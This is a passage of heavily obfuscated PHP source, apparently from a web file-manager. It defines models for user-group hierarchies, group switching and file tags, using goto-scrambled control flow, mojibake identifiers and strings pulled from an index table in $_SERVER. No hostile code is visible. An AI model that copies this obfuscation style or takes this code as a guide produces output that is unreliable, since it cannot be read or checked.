Cü¿ë›àíÌ; F§Òﬂ⁄Úè¥: $EŒ∞‚Ωø¯Ù =& $_SERVER[ú∫]; $CµõÜÇ÷§∫ = array($EŒ∞‚Ωø¯Ù[1692] => array($EŒ∞‚Ωø¯Ù[7], $b–ø°∑µÓá)); $aﬂãƒ‰∞Õ’ = Model($EŒ∞‚Ωø¯Ù[1772])->where($CµõÜÇ÷§∫)->select(); goto a¬Û»ÂççÈ; Cü¿ë›àíÌ: } protected function parentLevelArray($F≠ÜçÃúÑ›) { $c«Æ◊Çàâ« =& $_SERVER[ú∫]; $F≠ÜçÃúÑ› = explode($c«Æ◊Çàâ«[47], trim($F≠ÜçÃúÑ›, $c«Æ◊Çàâ«[47])); $F≠ÜçÃúÑ› = array_remove_value($F≠ÜçÃúÑ›, $c«Æ◊Çàâ«[191]); return $F≠ÜçÃúÑ›; } private function _listAppendParent(&$D¡πï¨Ã—∂) { goto b˜°·Â—ç; Dë™„Ë†€á: unset($fΩÛÑΩØº¨); foreach ($c≠˜‡“É¯à as $bœáÇïå∏≠ => $E˘ïå©ñ∆≥) { if ($E˘ïå©ñ∆≥) { continue; } $B£ìÒÛπÆ› = $this->getInfoSimple($bœáÇïå∏≠); $c≠˜‡“É¯à[$bœáÇïå∏≠] = $B£ìÒÛπÆ›[$E⁄Ã®Æ‡É£[28]]; } $eäÌ—Òã— = $GLOBALS[$E⁄Ã®Æ‡É£[6]][$E⁄Ã®Æ‡É£[88]][$E⁄Ã®Æ‡É£[1784]]; goto c–“Æ•≠ÊÑ; b˜°·Â—ç: $E⁄Ã®Æ‡É£ =& $_SERVER[ú∫]; $c≠˜‡“É¯à = array(); foreach ($D¡πï¨Ã—∂ as &$fΩÛÑΩØº¨) { $c≠˜‡“É¯à[$fΩÛÑΩØº¨[$E⁄Ã®Æ‡É£[1692]]] = $fΩÛÑΩØº¨[$E⁄Ã®Æ‡É£[28]]; $Eª¬¢¥§úÏ = $this->parentLevelArray($fΩÛÑΩØº¨[$E⁄Ã®Æ‡É£[487]]); foreach ($Eª¬¢¥§úÏ as $B›¶è§Û¢Ë) { if (!isset($c≠˜‡“É¯à[$B›¶è§Û¢Ë])) { $c≠˜‡“É¯à[$B›¶è§Û¢Ë] = 0; } } } goto Dë™„Ë†€á; c–“Æ•≠ÊÑ: if ($GLOBALS[$E⁄Ã®Æ‡É£[485]] == $E⁄Ã®Æ‡É£[87]) { $eäÌ—Òã— = !1; } foreach ($D¡πï¨Ã—∂ as &$fΩÛÑΩØº¨) { $Eª¬¢¥§úÏ = $this->parentLevelArray($fΩÛÑΩØº¨[$E⁄Ã®Æ‡É£[487]]); $AÏºé–∏‘† = $E⁄Ã®Æ‡É£[33]; foreach ($Eª¬¢¥§úÏ as $bœáÇïå∏≠ => $B›¶è§Û¢Ë) { if ($eäÌ—Òã— && $bœáÇïå∏≠ == 0) { continue; } $AÏºé–∏‘† .= $c≠˜‡“É¯à[$B›¶è§Û¢Ë] . $E⁄Ã®Æ‡É£[8]; } if ($Eª¬¢¥§úÏ) { $AÏºé–∏‘† .= $fΩÛÑΩØº¨[$E⁄Ã®Æ‡É£[28]]; } $fΩÛÑΩØº¨[$E⁄Ã®Æ‡É£[491]] = str_replace($E⁄Ã®Æ‡É£[496], $E⁄Ã®Æ‡É£[8], $AÏºé–∏‘†); } unset($fΩÛÑΩØº¨); goto bÉ®ÑºãñË; bÉ®ÑºãñË: } private function _listAppendSourceRoot(&$e⁄™‹¨ìÿ€, $CÇâçΩ‘Ê¨) { goto bûâÂô∑ÍÃ; bûâÂô∑ÍÃ: $EÉ∆ ≈Ø√ã =& $_SERVER[ú∫]; $Dîø´÷°ê€ = array($EÉ∆ ≈Ø√ã[404] => SourceModel::TYPE_GROUP, $EÉ∆ ≈Ø√ã[478] => 0, $EÉ∆ ≈Ø√ã[484] => array($EÉ∆ ≈Ø√ã[7], $CÇâçΩ‘Ê¨)); $e»Ê´í£‡Û = $EÉ∆ ≈Ø√ã[1785]; goto aôñ†©∫Îë; aôñ†©∫Îë: $déŸë÷ÔÛå = Model($EÉ∆ ≈Ø√ã[790])->order($EÉ∆ ≈Ø√ã[1786])->field($e»Ê´í£‡Û)->where($Dîø´÷°ê€)->select(); $déŸë÷ÔÛå = array_to_keyvalue($déŸë÷ÔÛå, $EÉ∆ ≈Ø√ã[484]); $déŸë÷ÔÛå = array_remove_key($déŸë÷ÔÛå, $EÉ∆ ≈Ø√ã[484]); goto cÿîª√Éå‰; cÿîª√Éå‰: foreach ($e⁄™‹¨ìÿ€ as &$cÆ∂õﬁ‡¢ê) { $cÆ∂õﬁ‡¢ê[$EÉ∆ ≈Ø√ã[85]] = $déŸë÷ÔÛå[$cÆ∂õﬁ‡¢ê[$EÉ∆ ≈Ø√ã[1692]]] ? $déŸë÷ÔÛå[$cÆ∂õﬁ‡¢ê[$EÉ∆ ≈Ø√ã[1692]]] : array(); } unset($cÆ∂õﬁ‡¢ê); goto aÜ¯Ï‘Ô•ü; aÜ¯Ï‘Ô•ü: } protected function groupMerge($C•ª◊Öúéê) { $C•ª◊Öúéê = array_values(array_unique($C•ª◊Öúéê)); $aˆ†îªé¢ü = array(); for ($c∫ö∂ëÙœö = 0; $c∫ö∂ëÙœö < count($C•ª◊Öúéê); $c∫ö∂ëÙœö++) { $báóÕ±™ø– = !1; for ($cã‹ÁÓ°˘Ì = 0; $cã‹ÁÓ°˘Ì < count($C•ª◊Öúéê); $cã‹ÁÓ°˘Ì++) { if ($c∫ö∂ëÙœö == $cã‹ÁÓ°˘Ì) { continue; } if ($this->isParentOf($C•ª◊Öúéê[$cã‹ÁÓ°˘Ì], $C•ª◊Öúéê[$c∫ö∂ëÙœö])) { $báóÕ±™ø– = !0; break; } } if (!$báóÕ±™ø–) { $aˆ†îªé¢ü[] = $C•ª◊Öúéê[$c∫ö∂ëÙœö]; } } return $aˆ†îªé¢ü; } protected function isParentOf($EºŒπˆ¬∑Ù, $d÷√¥πÉÕ˜) { goto DòÌ∫—ÉÁœ; DòÌ∫—ÉÁœ: $F«ÀÿŸ¶ä≠ =& $_SERVER[ú∫]; if (!$EºŒπˆ¬∑Ù || !$d÷√¥πÉÕ˜ || $EºŒπˆ¬∑Ù == $d÷√¥πÉÕ˜) { return !1; } $fÛî„◊ÙŸà = $this->getInfoSimple($EºŒπˆ¬∑Ù); goto CéÊ∏≈¯–÷; Cúö’õœÆ‹: return !1; goto bËÁë‚∑¢Æ; CéÊ∏≈¯–÷: $dÚÌÎ⁄™ñî = $this->getInfoSimple($d÷√¥πÉÕ˜); $fΩ˘∏ÒÆÆå = $fÛî„◊ÙŸà[$F«ÀÿŸ¶ä≠[487]] . $EºŒπˆ¬∑Ù . $F«ÀÿŸ¶ä≠[47]; if (substr($dÚÌÎ⁄™ñî[$F«ÀÿŸ¶ä≠[487]], 0, strlen($fΩ˘∏ÒÆÆå)) == $fΩ˘∏ÒÆÆå) { return !0; } goto Cúö’õœÆ‹; bËÁë‚∑¢Æ: } public function groupShowRoot($D°øÚö†Ñ€, $bõ™¬„Ÿﬂµ = false) { goto D¥õù’µ‘É; fÜäå€ñ√≈: $DÉÎë°òûË = $this->parentLevelArray($A÷˘–Ùñùå[$eáíà£Ö±◊[487]]); $D˘∆çÊå°¢ = array($D°øÚö†Ñ€); if (count($DÉÎë°òûË) == 0) { return $D˘∆çÊå°¢; } goto f™ôü‡´§ñ; cŸÂÏÇÍ£Í: return $D˘∆çÊå°¢; goto A≠è¬ÎıΩ√; f™ôü‡´§ñ: if ($bõ™¬„Ÿﬂµ && count($DÉÎë°òûË) == 1) { return $D˘∆çÊå°¢; } if (!$A÷˘–Ùñùå[$eáíà£Ö±◊[445]] || !isset($A÷˘–Ùñùå[$eáíà£Ö±◊[445]][$eáíà£Ö±◊[1768]]) || $A÷˘–Ùñùå[$eáíà£Ö±◊[445]][$eáíà£Ö±◊[1768]] == $eáíà£Ö±◊[1742]) { return $this->groupShowRoot($DÉÎë°òûË[count($DÉÎë°òûË) - 1], $bõ™¬„Ÿﬂµ); } if ($A÷˘–Ùñùå[$eáíà£Ö±◊[445]][$eáíà£Ö±◊[1768]] == $eáíà£Ö±◊[357]) { $E€û—ÈÒ›∆ = explode($eáíà£Ö±◊[47], $A÷˘–Ùñùå[$eáíà£Ö±◊[445]][$eáíà£Ö±◊[1769]]); if ($E€û—ÈÒ›∆) { $D˘∆çÊå°¢ = array_merge($D˘∆çÊå°¢, $E€û—ÈÒ›∆); } } goto cŸÂÏÇÍ£Í; D¥õù’µ‘É: $eáíà£Ö±◊ =& $_SERVER[ú∫]; $A÷˘–Ùñùå = $this->getInfo($D°øÚö†Ñ€); if (!$A÷˘–Ùñùå) { return array(); } goto fÜäå€ñ√≈; A≠è¬ÎıΩ√: } protected function resetParentLevel() { $B›≈úÚ≠é¨ =& $_SERVER[ú∫]; $B∂ßâôÂÃÓ = $B›≈úÚ≠é¨[1692]; $EÇâö«ûìÍ = $this->select(); $EÇâö«ûìÍ = array_to_keyvalue($EÇâö«ûìÍ, $B∂ßâôÂÃÓ); foreach ($EÇâö«ûìÍ as $AÑ◊èóÁôÆ) { goto f≈íÃä‘èâ; F·ﬂÀπÖæ€: $this->where(array($B∂ßâôÂÃÓ => $AÑ◊èóÁôÆ[$B∂ßâôÂÃÓ]))->save(array($B›≈úÚ≠é¨[553] => $e°äÇ ﬁ◊†)); goto e’¢≥¶ˆ™⁄; f≈íÃä‘èâ: $c‡¶æççïñ = $AÑ◊èóÁôÆ; $e°äÇ ﬁ◊† = array(); while ($c‡¶æççïñ[$B›≈úÚ≠é¨[478]] != 0) { $e°äÇ ﬁ◊†[] = $c‡¶æççïñ[$B›≈úÚ≠é¨[478]]; $c‡¶æççïñ = $EÇâö«ûìÍ[$c‡¶æççïñ[$B›≈úÚ≠é¨[478]]]; } goto CÊáç≥Á∂ì; CÊáç≥Á∂ì: $e°äÇ ﬁ◊†[] = 0; $e°äÇ ﬁ◊† = $B›≈úÚ≠é¨[47] . implode($B›≈úÚ≠é¨[47], array_reverse($e°äÇ ﬁ◊†)) . $B›≈úÚ≠é¨[47]; $this->setNamePinyin($AÑ◊èóÁôÆ[$B∂ßâôÂÃÓ], $AÑ◊èóÁôÆ[$B›≈úÚ≠é¨[28]]); goto F·ﬂÀπÖæ€; e’¢≥¶ˆ™⁄: } return $EÇâö«ûìÍ; } public function groupNameAuto($Aë–°êÂÖ·, $C˘œ‚¡’§ñ) { $fï“¢ÈÌÏ’ =& $_SERVER[ú∫]; $cŒãˆ†Úó¨ = $this->where(array($fï“¢ÈÌÏ’[394] => $Aë–°êÂÖ·))->getField($fï“¢ÈÌÏ’[28], !0); if (!$cŒãˆ†Úó¨ || !in_array($C˘œ‚¡’§ñ, $cŒãˆ†Úó¨)) { return $C˘œ‚¡’§ñ; } for ($DáÛÙ⁄ã…Ö = 1; $DáÛÙ⁄ã…Ö <= count($cŒãˆ†Úó¨) + 1; $DáÛÙ⁄ã…Ö++) { $BçàÍÁÙÕŒ = $C˘œ‚¡’§ñ . "\50{$DáÛÙ⁄ã…Ö}\51"; if (!in_array($BçàÍÁÙÕŒ, $cŒãˆ†Úó¨)) { return $BçàÍÁÙÕŒ; } } } public function groupSwitch($aÇΩõÃä„ò, $E‰í≥Õ◊–“) { goto eﬁ®ç£†œ∞; aîƒ´†Œ∑ú: $DÉÆ¯ôõªé = !empty($c—§œ‡≤ÛÂ[$aÇΩõÃä„ò]) ? $c—§œ‡≤ÛÂ[$aÇΩõÃä„ò] : !1; if ($DÉÆ¯ôõªé) { goto A≥÷âî üœ; A≥÷âî üœ: if (!$c—§œ‡≤ÛÂ[$E‰í≥Õ◊–“]) { $c—§œ‡≤ÛÂ[$E‰í≥Õ◊–“] = Model($dí§óÃÜ’…[790])->groupRootAdd($E‰í≥Õ◊–“); } $C‰ÜºﬁèÜµ = $c—§œ‡≤ÛÂ[$E‰í≥Õ◊–“]; $fÕ¨≠Àµ·É = array($dí§óÃÜ’…[478] => $DÉÆ¯ôõªé); goto E⁄òß∆Èàﬂ; FöﬁÊπ˘Éõ: $aÂñË“í“ø = array($dí§óÃÜ’…[484] => $E‰í≥Õ◊–“); Model($dí§óÃÜ’…[1790])->where($fÕ¨≠Àµ·É)->save($aÂñË“í“ø); Model($dí§óÃÜ’…[1791])->where($fÕ¨≠Àµ·É)->save($aÂñË“í“ø); goto Dúéˆàˆƒ¿; bàÒﬂ°†≥â: foreach ($c—§œ‡≤ÛÂ as $cåÉ™∞≈îÃ) { $aøÕÓ•Ô‹Û = $cåÉ™∞≈îÃ[$dí§óÃÜ’…[403]] == $dí§óÃÜ’…[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($dí§óÃÜ’…[790])->move($cåÉ™∞≈îÃ[$dí§óÃÜ’…[395]], $C‰ÜºﬁèÜµ, $aøÕÓ•Ô‹Û); } Model($dí§óÃÜ’…[790])->moveClearAuth = !0; $fÕ¨≠Àµ·É = array($dí§óÃÜ’…[404] => 2, $dí§óÃÜ’…[484] => $aÇΩõÃä„ò); goto FöﬁÊπ˘Éõ; E⁄òß∆Èàﬂ: $c—§œ‡≤ÛÂ = Model($dí§óÃÜ’…[790])->where($fÕ¨≠Àµ·É)->field($dí§óÃÜ’…[1789])->select(); if (!$c—§œ‡≤ÛÂ) { $c—§œ‡≤ÛÂ = array(); } Model($dí§óÃÜ’…[790])->moveClearAuth = !1; goto bàÒﬂ°†≥â; Dúéˆàˆƒ¿: } $this->_changeChildLevel($E„‡Úø√πº[$aÇΩõÃä„ò], $E„‡Úø√πº[$E‰í≥Õ◊–“], !0); goto e¶í…£Â≤¶; bªΩÁÜ—ﬂ‹: $fÕ¨≠Àµ·É = array($dí§óÃÜ’…[404] => 2, $dí§óÃÜ’…[478] => 0, $dí§óÃÜ’…[403] => 1, $dí§óÃÜ’…[484] => array($dí§óÃÜ’…[7], array($aÇΩõÃä„ò, $E‰í≥Õ◊–“))); $c—§œ‡≤ÛÂ = Model($dí§óÃÜ’…[790])->where($fÕ¨≠Àµ·É)->field($dí§óÃÜ’…[1788])->select(); $c—§œ‡≤ÛÂ = array_to_keyvalue($c—§œ‡≤ÛÂ, $dí§óÃÜ’…[484], $dí§óÃÜ’…[395]); goto aîƒ´†Œ∑ú; Eï´èìË®ã: $F¢ƒÃﬁáÈÉ = Model($dí§óÃÜ’…[1773])->where($fÕ¨≠Àµ·É)->select(); if (!$F¢ƒÃﬁáÈÉ) { $F¢ƒÃﬁáÈÉ = array(); } foreach ($F¢ƒÃﬁáÈÉ as $D®’†Ûô”‹) { $CœøÜ°•µﬁ = $D®’†Ûô”‹[$dí§óÃÜ’…[1528]]; $fÕ¨≠Àµ·É = array($dí§óÃÜ’…[1528] => $CœøÜ°•µﬁ, $dí§óÃÜ’…[1692] => $E‰í≥Õ◊–“); $BÖ£â¥é‡† = Model($dí§óÃÜ’…[1773])->where($fÕ¨≠Àµ·É)->find(); if (!$BÖ£â¥é‡†) { $AëÑ›ùåﬂ¥ = array($E‰í≥Õ◊–“ => $D®’†Ûô”‹[$dí§óÃÜ’…[1787]]); Model($dí§óÃÜ’…[506])->userGroupAdd($CœøÜ°•µﬁ, $AëÑ›ùåﬂ¥); } Model($dí§óÃÜ’…[506])->userGroupRemove($CœøÜ°•µﬁ, $aÇΩõÃä„ò); } goto bªΩÁÜ—ﬂ‹; e¶í…£Â≤¶: $this->where(array($dí§óÃÜ’…[478] => $aÇΩõÃä„ò))->save(array($dí§óÃÜ’…[478] => $E‰í≥Õ◊–“)); return !0; goto Cÿ“⁄”Á†À; Dà†îåƒÛ≈: $E„‡Úø√πº = array_to_keyvalue($E„‡Úø√πº, $dí§óÃÜ’…[1692]); if (!isset($E„‡Úø√πº[$aÇΩõÃä„ò]) || !isset($E„‡Úø√πº[$E‰í≥Õ◊–“]) || $E„‡Úø√πº[$aÇΩõÃä„ò][$dí§óÃÜ’…[478]] == 0) { return !1; } $fÕ¨≠Àµ·É = array($dí§óÃÜ’…[1692] => $aÇΩõÃä„ò); goto Eï´èìË®ã; eﬁ®ç£†œ∞: $dí§óÃÜ’… =& $_SERVER[ú∫]; $fÕ¨≠Àµ·É = array($dí§óÃÜ’…[1692] => array($dí§óÃÜ’…[7], array($aÇΩõÃä„ò, $E‰í≥Õ◊–“))); $E„‡Úø√πº = $this->where($fÕ¨≠Àµ·É)->select(); goto Dà†îåƒÛ≈; Cÿ“⁄”Á†À: } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($A»√†◊ê¢±) { $c…ﬂ•§’Ÿ¶ =& $_SERVER[ú∫]; return array($c…ﬂ•§’Ÿ¶[1792] => array($A»√†◊ê¢±[0], $c…ﬂ•§’Ÿ¶[1793]), $c…ﬂ•§’Ÿ¶[1794] => array($A»√†◊ê¢±[0], $c…ﬂ•§’Ÿ¶[1795])); } protected function get($Dÿî∑Êäü‰) { $DŸ©á•√∫ø =& $_SERVER[ú∫]; $cØò∫è¶åë = Model($DŸ©á•√∫ø[486])->metaGet($Dÿî∑Êäü‰, $DŸ©á•√∫ø[1796]); $CÈ–Ω”··„ = json_decode($cØò∫è¶åë, !0); return $CÈ–Ω”··„ ? $CÈ–Ω”··„ : array($DŸ©á•√∫ø[1797] => $DŸ©á•√∫ø[87], $DŸ©á•√∫ø[367] => array()); } protected function set($eú‡öóö§ç, $e–˘Ñ√√äÈ) { $eë¥àÇ± â =& $_SERVER[ú∫]; $e–˘Ñ√√äÈ = $e–˘Ñ√√äÈ ? $e–˘Ñ√√äÈ : array($eë¥àÇ± â[1797] => $eë¥àÇ± â[87], $eë¥àÇ± â[367] => array()); Model($eë¥àÇ± â[486])->metaSet($eú‡öóö§ç, $eë¥àÇ± â[1796], json_encode($e–˘Ñ√√äÈ)); return Model($eë¥àÇ± â[486])->metaSet($eú‡öóö§ç, $eë¥àÇ± â[1796], json_encode($e–˘Ñ√√äÈ)); } protected function getByTagID($A“Ω¨Ω›‚É, $b⁄ÜΩπÑã÷) { goto dπ°”Ø¢Ã‰; aô±Ω¥ÑÜØ: $e’ëΩëÂ¯‚ = $this->get($A“Ω¨Ω›‚É); if (!$e’ëΩëÂ¯‚ || !isset($e’ëΩëÂ¯‚[$dπ„¶√Æ´˘[367]])) { return !1; } $Aˆ∫—ØêÃÊ = array_find_by_field($e’ëΩëÂ¯‚[$dπ„¶√Æ´˘[367]], $dπ„¶√Æ´˘[393], $b⁄ÜΩπÑã÷); goto F©Í‡ ëıë; dπ°”Ø¢Ã‰: $dπ„¶√Æ´˘ =& $_SERVER[ú∫]; if (!$A“Ω¨Ω›‚É || !$b⁄ÜΩπÑã÷) { return !1; } if (!Model($dπ„¶√Æ´˘[486])->getInfoSimple($A“Ω¨Ω›‚É)) { return !1; } goto aô±Ω¥ÑÜØ; F©Í‡ ëıë: return is_array($Aˆ∫—ØêÃÊ) ? $Aˆ∫—ØêÃÊ : !1; goto Fæ… ŸØÆˆ; Fæ… ŸØÆˆ: } public function listSource($céëÜ«∑ÜË, $aË∑›ﬁ›Ñ¿) { goto aÓãπñâ’ô; EÿèÑÙŸ∫¬: foreach ($BºÉè›á†¶ as $BÁÇÆ¨‰⁄Ô => $C∏ÙôÀ˘ëØ) { $a“∂ﬂ⁄ﬂå™ = !0; if (!$aË∑›ﬁ›Ñ¿) { $b•êàÇÛ∆ÿ[] = $BÁÇÆ¨‰⁄Ô; continue; } foreach ($aË∑›ﬁ›Ñ¿ as $bÓπäãÖÃ”) { if (!in_array($bÓπäãÖÃ”, $C∏ÙôÀ˘ëØ)) { $a“∂ﬂ⁄ﬂå™ = !1; break; } } if ($a“∂ﬂ⁄ﬂå™) { $b•êàÇÛ∆ÿ[] = $BÁÇÆ¨‰⁄Ô; } } if (!$b•êàÇÛ∆ÿ) { return array(); } $D∏≥–¨∑ªê = array($dœïˆ¯¢•ü[410] => array($dœïˆ¯¢•ü[411], $b•êàÇÛ∆ÿ), $dœïˆ¯¢•ü[484] => $céëÜ«∑ÜË, $dœïˆ¯¢•ü[404] => SourceModel::TYPE_GROUP); goto eÙ÷˘πœ€∫; c ©áÛÉ®–: $e’ß’äê£® = array_to_keyvalue($dõ›Éñ◊–¯[$dœïˆ¯¢•ü[75]], $dœïˆ¯¢•ü[33], $dœïˆ¯¢•ü[395]); $F˜ÌÈä≤ÑÆ = array_to_keyvalue($dõ›Éñ◊–¯[$dœïˆ¯¢•ü[74]], $dœïˆ¯¢•ü[33], $dœïˆ¯¢•ü[395]); $b¨ƒ£ë åÍ = array_merge($F˜ÌÈä≤ÑÆ, $e’ß’äê£®); goto B≤ëı‘Á∞Ù; eÙ÷˘πœ€∫: $dõ›Éñ◊–¯ = Model($dœïˆ¯¢•ü[1206])->listSource($D∏≥–¨∑ªê); if (!$dõ›Éñ◊–¯ || count($b•êàÇÛ∆ÿ) == $dõ›Éñ◊–¯[$dœïˆ¯¢•ü[364]][$dœïˆ¯¢•ü[365]]) { return $dõ›Éñ◊–¯; } $b€…ÿ≠Í©Ã = array(); goto c ©áÛÉ®–; aÓãπñâ’ô: $dœïˆ¯¢•ü =& $_SERVER[ú∫]; if ($aË∑›ﬁ›Ñ¿ && !is_array($aË∑›ﬁ›Ñ¿)) { $aË∑›ﬁ›Ñ¿ = array($aË∑›ﬁ›Ñ¿); } $D€Òû£’áˆ = $this->listData($céëÜ«∑ÜË); goto C”∞–ﬂÇ§’; B≤ëı‘Á∞Ù: foreach ($b•êàÇÛ∆ÿ as $DˆßŒ˜ƒøπ) { if (!in_array($DˆßŒ˜ƒøπ, $b¨ƒ£ë åÍ)) { $b€…ÿ≠Í©Ã[] = $DˆßŒ˜ƒøπ; } } if ($b€…ÿ≠Í©Ã) { $this->removeBySource($céëÜ«∑ÜË, $b€…ÿ≠Í©Ã); } return $dõ›Éñ◊–¯; goto dÁÜ¥òﬂ”É; C”∞–ﬂÇ§’: $BºÉè›á†¶ = array(); foreach ($D€Òû£’áˆ as $BÃ£èû®î∂) { $DˆßŒ˜ƒøπ = $BÃ£èû®î∂[$dœïˆ¯¢•ü[76]]; if (!$DˆßŒ˜ƒøπ) { continue; } if (!isset($BºÉè›á†¶[$DˆßŒ˜ƒøπ])) { $BºÉè›á†¶[$DˆßŒ˜ƒøπ] = array(); } $BºÉè›á†¶[$DˆßŒ˜ƒøπ][] = $BÃ£èû®î∂[$dœïˆ¯¢•ü[419]]; } $b•êàÇÛ∆ÿ = array(); goto EÿèÑÙŸ∫¬; dÁÜ¥òﬂ”É: } protected function listData($Cœ≤¯øåè¯) { $e¥ÂãõãŸ´ =& $_SERVER[ú∫]; $E«÷ùÓïôê = array($e¥ÂãõãŸ´[1520] => 0, $e¥ÂãõãŸ´[463] => array($e¥ÂãõãŸ´[1798], 0), $e¥ÂãõãŸ´[415] => $e¥ÂãõãŸ´[1799] . $Cœ≤¯øåè¯); $cå’¿€ù¿º = $e¥ÂãõãŸ´[1800]; $B•Ω•ú¿°® = $this->field($cå’¿€ù¿º)->where($E«÷ùÓïôê)->order($e¥ÂãõãŸ´[1801])->select(); return $B•Ω•ú¿°® ? $B•Ω•ú¿°® : array(); } protected function addToTag($EôÀÛÿ≈Ω÷, $FÊƒﬂùµÀ§, $F’§™Çﬂﬁ») { $E»ﬂ∑†èÍÛ =& $_SERVER[ú∫]; if (!$this->getByTagID($EôÀÛÿ≈Ω÷, $F’§™Çﬂﬁ») || !$FÊƒﬂùµÀ§) { return !1; } if (!Model($E»ﬂ∑†èÍÛ[790])->pathInfo($FÊƒﬂùµÀ§)) { return !1; } $cÜûè«ìç˘ = array($E»ﬂ∑†èÍÛ[1520] => 0, $E»ﬂ∑†èÍÛ[463] => $F’§™Çﬂﬁ», $E»ﬂ∑†èÍÛ[414] => $FÊƒﬂùµÀ§, $E»ﬂ∑†èÍÛ[415] => $E»ﬂ∑†èÍÛ[1802] . $EôÀÛÿ≈Ω÷, $E»ﬂ∑†èÍÛ[413] => $E»ﬂ∑†èÍÛ[33], $E»ﬂ∑†èÍÛ[1696] => 0); if ($this->where($cÜûè«ìç˘)->find()) { return !1; } return $this->add($cÜûè«ìç˘); } protected function removeFromTag($Dñ®∏°÷õ, $eÜÍ´‹ãˆ©, $bÉÒ⁄Ã¡’“) { $dõ‰⁄ÜÇ‰Ö =& $_SERVER[ú∫]; if (!$this->getByTagID($Dñ®∏°÷õ, $bÉÒ⁄Ã¡’“) || !$eÜÍ´‹ãˆ©) { return !1; } if (is_array($eÜÍ´‹ãˆ©)) { $eÜÍ´‹ãˆ© = array($dõ‰⁄ÜÇ‰Ö[7], $eÜÍ´‹ãˆ©); } $c≠¡¬ÁÂÁ… = array($dõ‰⁄ÜÇ‰Ö[1520] => 0, $dõ‰⁄ÜÇ‰Ö[463] => $bÉÒ⁄Ã¡’“, $dõ‰⁄ÜÇ‰Ö[415] => $dõ‰⁄ÜÇ‰Ö[1802] . $Dñ®∏°÷õ, $dõ‰⁄ÜÇ‰Ö[414] => $eÜÍ´‹ãˆ©); return $this->where($c≠¡¬ÁÂÁ…)->delete(); } protected function removeByTag($C™àáòáñ´, $Aäëõ’Á˜∑) { $dã¥Ìå™¿– =& $_SERVER[ú∫]; if (!$this->getByTagID($C™àáòáñ´, $Aäëõ’Á˜∑)) { return !1; } $fÜ’«óÈ€å = array($dã¥Ìå™¿–[1520] => 0, $dã¥Ìå™¿–[463] => $Aäëõ’Á˜∑, $dã¥Ìå™¿–[415] => $dã¥Ìå™¿–[1802] . $C™àáòáñ´); return $this->where($fÜ’«óÈ€å)->delete(); } protected function removeBySource($B√Öç∂ÉÉå, $D≈—¿›ñ•Õ) { $AÍáœ´èÌà =& $_SERVER[ú∫]; if (!$B√Öç∂ÉÉå || !$D≈—¿›ñ•Õ) { return !1; } if (is_array($D≈—¿›ñ•Õ)) { $D≈—¿›ñ•Õ = array($AÍáœ´èÌà[7], $D≈—¿›ñ•Õ); } $D…õí◊¿ïÿ = array($AÍáœ´èÌà[1520] => 0, $AÍáœ´èÌà[414] => $D≈—¿›ñ•Õ, $AÍáœ´èÌà[463] => array($AÍáœ´èÌà[971], 0), $AÍáœ´èÌà[415] => $AÍáœ´èÌà[1802] . $B√Öç∂ÉÉå); return $this->where($D…õí◊¿ïÿ)->delete(); } } goto d∫©˘çå è; EÑÜ…‚”úñ: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\157\144\151\146\x79\124\151\x6d\145", "\164\151\x6d\145", "\151\x6e\x73\145\162\164\54\165\x70\144\141\164\145", "\x66\165\156\x63\x74\151\x6f\x6e"), array("\x63\162\145\141\164\x65\124\x69\155\145", "\164\x69\155\x65", "\151\x6e\163\145\x72\164", "\146\165\x6e\143\164\x69\x6f\x6e")); public function setDataAuto($a≤∞º—Ùê“) { $this->dataAuto = $a≤∞º—Ùê“; } public function __construct($Bﬂ≈ÃŒ∏ÿÖ = '', $fÛáå≠‘Ëá = '', $càÍ°¨‚≈ü = '') { parent::__construct($Bﬂ≈ÃŒ∏ÿÖ, $fÛáå≠‘Ëá, $càÍ°¨‚≈ü); } public static function textEncode($büÛÆÍªÆÊ) { if (!$büÛÆÍªÆÊ) { return $büÛÆÍªÆÊ; } $b Çù—ƒ≠Ω = json_encode($büÛÆÍªÆÊ); $b Çù—ƒ≠Ω = preg_replace_callback($_SERVER[ú∫][353], function ($BÑ¯ê’¢¬ô) { return addslashes($BÑ¯ê’¢¬ô[0]); }, $b Çù—ƒ≠Ω); return json_decode($b Çù—ƒ≠Ω); } public static function textDecode($B¥Ü‰…®º«) { $C«£§ÉôáÙ =& $_SERVER[ú∫]; $F•áÇÈà¢≥ = json_encode($B¥Ü‰…®º«); $F•áÇÈà¢≥ = preg_replace_callback($C«£§ÉôáÙ[354], function ($DﬁÁØÑ‰§ö) { return $_SERVER[ú∫][97]; }, $F•áÇÈà¢≥); return json_decode($F•áÇÈà¢≥); } protected $tableMeta = array(); protected function _beforeInsert(&$e∫∞´’Ùªˆ, $B√∆™ÊûÀ) { $DÔ≈ä∏«û« =& $_SERVER[ú∫]; if (!$this->checkDataAutoHas($DÔ≈ä∏«û«[355])) { return; } $this->dataBeforeFilter($e∫∞´’Ùªˆ, $DÔ≈ä∏«û«[355]); } protected function _beforeUpdate(&$Cïú—ê©ë÷, $EÕï∆∏¨’Ö) { $A˜€â¶ﬁâ∫ =& $_SERVER[ú∫]; if (!$this->checkDataAutoHas($A˜€â¶ﬁâ∫[356])) { return; } $this->dataBeforeFilter($Cïú—ê©ë÷, $A˜€â¶ﬁâ∫[356]); } protected function _afterSelect(&$f„ÏÉìˆ∑√, $Cπ¿ã…Ωﬂ≤) { if (!is_array($f„ÏÉìˆ∑√)) { return; } if (!$this->checkDataAutoHas($_SERVER[ú∫][357])) { return; } foreach ($f„ÏÉìˆ∑√ as &$d∆ÎíãïÌ÷) { $this->dataAfterFilter($d∆ÎíãïÌ÷); } unset($d∆ÎíãïÌ÷); } protected function _afterFind(&$fªëÂÛôÉÈ, $d≈’Õä∞Ù∞) { if (!is_array($fªëÂÛôÉÈ)) { return; } if (!$this->checkDataAutoHas($_SERVER[ú∫][357])) { return; } $this->dataAfterFilter($fªëÂÛôÉÈ); } public function setAutoIncrement($A—Ñ±Ìá„‹) { $b÷üá‘öò« = array($this->getPk() => $A—Ñ±Ìá„‹); $cı÷ÕÒÑ«  = $this->data($b÷üá‘öò«)->add(); if ($cı÷ÕÒÑ« ) { $this->delete($cı÷ÕÒÑ« ); } } public function getAutoIncrement() { $dÚ¯ô»∑‚¨ = $this->getTableName(); $eü§ì¿Ñ…Ω = $this->max($this->getPk()); $aÒò”∆˜ñ« = 